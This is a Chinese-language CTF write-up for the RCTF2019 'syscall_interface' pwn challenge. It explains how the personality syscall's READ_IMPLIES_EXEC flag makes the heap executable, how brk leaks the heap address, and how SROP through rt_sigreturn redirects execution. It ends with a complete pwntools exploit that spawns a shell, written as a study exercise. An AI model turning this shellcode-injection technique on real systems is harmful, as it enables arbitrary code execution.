---
title: RCTF2019_syscall_interface
date: 2019-05-29 22:56:48
tags: shellcode
layout: post
---
复现 syscall_interface. 
<!--more-->
# syscall_INTERFACE 
[bianry][2]
题目提供了syscall的借口但是只有一个可用参数
禁止用[0x38,0x3b]的调用
全保护
对系统调用的熟悉程度或者说是学习能力比较重要.
发现自己还是知道的太少了.
本篇无干货建议移步原文.
比赛的时候没做出来赛后看的`balsn`的[write_up][1]
TQL 这个思路很奇妙
# personality
135号调用一个参数：`unsigned int personality`
查看手册`http://man7.org/linux/man-pages/man2/personality.2.html`
```c
READ_IMPLIES_EXEC (since Linux 2.6.8)
With this flag set, PROT_READ implies PROT_EXEC for mmap(2).
```
这个调用可以设置程序的一些...personality?
真有那么好的事情吗...`read`就是`exec`试试看.
```c
//https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/sys/personality.h.html
enum
{
UNAME26 = 0x0020000,
ADDR_NO_RANDOMIZE = 0x0040000,
FDPIC_FUNCPTRS = 0x0080000,
MMAP_PAGE_ZERO = 0x0100000,
ADDR_COMPAT_LAYOUT = 0x0200000,
READ_IMPLIES_EXEC = 0x0400000,
ADDR_LIMIT_32BIT = 0x0800000,
SHORT_INODE = 0x1000000,
WHOLE_SECONDS = 0x2000000,
STICKY_TIMEOUTS = 0x4000000,
ADDR_LIMIT_3GB =         0x8000000
};
```
测试代码/main.c
```c
#include<stdio.h>
#include<stdlib.h>
int main()
{
__asm__(
"xor %rax,%rax\t\n"
"mov $135,%rax\t\n"
"xor %rdi,%rdi\t\n"
"mov $0x400000,%rdi\t\n"
"syscall"
);
char *a=malloc(0x100);

}
//gcc main.c -o main
```
gdb调戏之
```s
0x00600000         0x00601000         r--p    /home/n132/Desktop/main
0x00601000         0x00602000         rw-p    /home/n132/Desktop/main
0x00602000         0x00623000         rwxp    [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-li
```

发现之后申请的可读内存是可以执行的.
太强了...这个系统调用我见都没见过...


# brk
这个相对熟悉，比赛时也想到了用来泄漏`heap`地址之后因为时行缓冲所以我们的输入会在`heap`（如果参数小于当前brk尝试收缩，无法收缩则返回当前brk,大于则尝试拓展）。

可以去`/mm/mmap.c`里看看实现.
# sys_rt_sigreturn

在`SROP`中学习过一些皮毛.如果可以控制栈可以控制执行流.
因为`set_name`功能可以控制一定栈内容 恰好`RIP`，`csgsfs`都在比较考前的位置.所以可以用`set-name`设置
继而利用`sys_rt_sigreturn`控制`RIP`


# 思路
balsn的做法真的非常精妙.
总的是利用`brk`泄漏地址，`personality`使得`heap`可以执行，`sys_rt_sigreturn`控制执行流.
具体是:
* `personality` 参数为0x400000,`printf`时调用`malloc`,堆可执行.
* `brk`泄漏堆地址.
* `set_name`预设好`rip`和`shellcode`（别忘记设置`csgsfs`）
* 随便调用一个系统调用 利用`printf`将 `shellcode`打到`heap`上
* 调用`sys_rt_sigreturn`

# exp
```python
from pwn import *
def cmd(c):
p.sendlineafter("ice:",str(c))
def set_name(n):
cmd(1)
p.sendafter("name:",n)
def sys(rax,rdi):
cmd(0)
p.sendlineafter("ber:",str(rax))
p.sendlineafter("ment:",str(rdi))
#context.log_level='debug'
p=process('./syscall_interface')
context.arch='amd64'

sys(135,0x0400000)#0
sys(12,0)#1

p.readuntil("RET(")
base=int(p.readuntil(")")[:-1],16)-(0x0000555555778000-0x0000555555757000)
log.info(hex(base))
#rbp rbx rdx rax rcx rsp rip
rbp=base
sh="""
pop rbx
mov rsi,rsp
push rsi
syscall
ret
"""
sig=asm(sh).ljust(0x10,'\x90')+p64(0x100)+p64(0)+p64(0)+p64(base+0x100)+p64(base+0x40)+p64(0)+p64(0x33)
set_name(sig)

sys(12,0)
#gdb.attach(p,'b *0x000555555554EC8')
sys(15,0)#base-0x1000+0x10-0x60)#0

p.send(asm(shellcraft.sh()))

p.interactive()
```


# summary
比赛的时候就去找一个参数或者0参数的系统调用发现了`brk`和`sigret`但是感觉没啥用泄漏的不是libc地址.
差了`personality`，走歪了一直想办法泄漏`libc`地址

但是即使发现了`personality`的0x400000我感觉这样的利用方式我目前的实力还是有差距.
还是知识面太窄了太菜了.
`balsn`太强了
`2019`太强了



[1]: https://balsn.tw/ctf_writeup/20190518-rctf2019/#syscall_interface
[2]: https://github.com/n132/Watermalon/tree/master/RCTF-2019/pwn/syscall_interface

